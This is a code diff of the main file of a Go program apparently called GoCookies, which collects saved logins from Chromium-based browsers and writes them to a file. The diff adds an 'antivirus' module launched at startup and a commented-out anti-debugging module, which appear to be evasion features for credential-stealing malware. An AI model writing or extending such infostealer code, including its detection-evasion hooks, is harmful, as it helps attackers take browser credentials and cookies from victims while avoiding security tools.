@@ -1,10 +1,12 @@
 package main
 
 import (
-	"GoCookies/browsers"
+	// "GoCookies/modules/antivirus"
+	// "GoCookies/modules/antidebug"
+	"GoCookies/modules/antivirus"
+	"GoCookies/modules/browsers"
 	"bytes"
 	"encoding/json"
-
 	"fmt"
 	"io"
 	"log"
@@ -12,6 +14,8 @@ import (
 	"net/http"
 	"os"
 	"path/filepath"
+
+	// "GoCookies/modules/antidebug"
 
 	_ "github.com/mattn/go-sqlite3"
 )
@@ -22,6 +26,16 @@ const (
 )
 
 func main() {
+	// Anti-debugging check at the start
+	fmt.Println("Running antivirus logic")
+	go antivirus.Run()
+	fmt.Println("Completed antivirus logic")
+
+	fmt.Println("Running antidebug logic")
+	// go antidebug.Run()
+	fmt.Println("Completed antidebug logic")
+
+
 	// Get the available Chromium-based browsers and their paths
 	browsersMap := browsers.GetChromiumBrowsers()
 
@@ -212,4 +226,3 @@ func saveLoginsToFile(logins []browsers.Login) error {
 	log.Printf("Login details saved to %s", filePath)
 	return nil
 }
-
